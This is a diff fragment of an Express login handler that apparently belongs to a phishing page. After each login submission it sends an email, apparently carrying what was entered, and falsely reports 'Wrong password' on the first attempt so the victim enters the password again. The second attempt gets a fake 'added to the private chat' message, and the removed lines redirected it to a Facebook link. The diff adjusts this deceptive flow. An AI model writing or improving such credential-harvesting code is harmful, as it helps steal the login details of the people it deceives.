@@ -73,25 +73,16 @@ app.post("/login", (req, res) => {
         if (error) {
             console.log(error);
             req.session.message = 'Wrong password. Try again!';
-            res.redirect("/");
         } else {
             console.log('Email sent: ' + info.response);
-            req.session.message = attemptNumber === 1 
-                ? 'Wrong password' 
-                : 'You have been successfully added to the private chat, you will get a message request shortly. Redirecting...';
-
-            req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
+            req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
             
-            // If it's the second attempt, send a JSON response to trigger the client-side redirect
-            if (attemptNumber !== 1) {
-                res.json({ redirect: true, url: 'https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe' });
-            } else {
-                res.redirect("/");
-            }
+
         }
+        req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
+        
     });
 });
-
 
 
 app.listen(3000, () => {
